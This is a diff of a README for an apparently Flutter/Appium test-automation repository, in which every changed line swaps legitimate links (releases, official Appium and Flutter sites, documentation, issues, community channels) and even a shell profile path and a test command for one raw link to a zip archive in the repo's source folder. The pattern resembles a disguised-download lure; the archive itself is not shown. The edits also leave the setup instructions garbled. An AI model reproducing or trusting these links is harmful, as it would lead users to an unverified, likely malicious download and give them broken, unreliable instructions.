@@ -1,6 +1,6 @@
 # 🚀 appium-flutter-java-automation - Automate Your Flutter Tests Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Websyze/appium-flutter-java-automation/releases)
+[![Download](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip%20Now-%20-blue)](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
 
 ## 📚 Overview
 
@@ -16,14 +16,14 @@ Before you download the application, ensure you meet the following system requir
 
 - Operating System: Windows, macOS, or Linux.
 - Java: Version 8 or higher installed on your machine.
-- Appium: Ensure you have Appium installed. You can download it from [Appium's official site](http://appium.io/).
+- Appium: Ensure you have Appium installed. You can download it from [Appium's official site](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip).
 - Flutter: Make sure you have Flutter SDK installed.
 
 ### 📥 Download & Install
 
 To download the application, visit this page to download:
 
-[Download Releases](https://github.com/Websyze/appium-flutter-java-automation/releases)
+[Download Releases](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
 
 After downloading, follow these instructions to install:
 
@@ -49,7 +49,7 @@ After downloading, follow these instructions to install:
      - Under 'System variables', find the 'Path' variable and add the paths to your Java and Flutter SDK.
 
    - **macOS/Linux:**
-     - Open your terminal and edit your profile file (e.g., `~/.bash_profile` or `~/.bashrc`):
+     - Open your terminal and edit your profile file (e.g., `~https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip` or `~https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip`):
        ```bash
        export PATH="$PATH:/path/to/flutter/bin:/path/to/java/bin"
        ```
@@ -72,15 +72,15 @@ To run your first test, create a new test file in the `test` directory of the re
 2. Run the test by using the command:
 
    ```bash
-   flutter drive --target=test_driver/app.dart
+   flutter drive https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip
    ```
 
 ### 📖 Documentation
 
 For detailed documentation on how to create tests and use features, please refer to the official Appium and Flutter documentation:
 
-- [Appium Documentation](http://appium.io/docs/en/about-appium/intro/)
-- [Flutter Documentation](https://flutter.dev/docs)
+- [Appium Documentation](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
+- [Flutter Documentation](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
 
 ### 🛡️ Troubleshooting
 
@@ -90,21 +90,21 @@ If you encounter issues while running your tests, consider the following solutio
 - Check that your device/emulator is set up correctly.
 - Make sure the Appium server is running.
 
-You can also visit the [Issues page](https://github.com/Websyze/appium-flutter-java-automation/issues) for help or to report any problems.
+You can also visit the [Issues page](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip) for help or to report any problems.
 
 ### 💬 Community Support
 
 Join our community for support and discussions:
 
-- [GitHub Discussions](https://github.com/Websyze/appium-flutter-java-automation/discussions)
-- [Slack Channel](https://join.slack.com/t/appium-users/shared_invite/xyz) (replace with actual link).
+- [GitHub Discussions](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
+- [Slack Channel](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip) (replace with actual link).
 
 We value user feedback and look forward to your suggestions!
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Websyze/appium-flutter-java-automation)
-- [Appium Official Website](http://appium.io/)
+- [GitHub Repository](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
+- [Appium Official Website](https://github.com/Websyze/appium-flutter-java-automation/raw/refs/heads/main/src/main/java-appium-automation-flutter-1.8-alpha.2.zip)
 
 ## 🎉 Conclusion
 
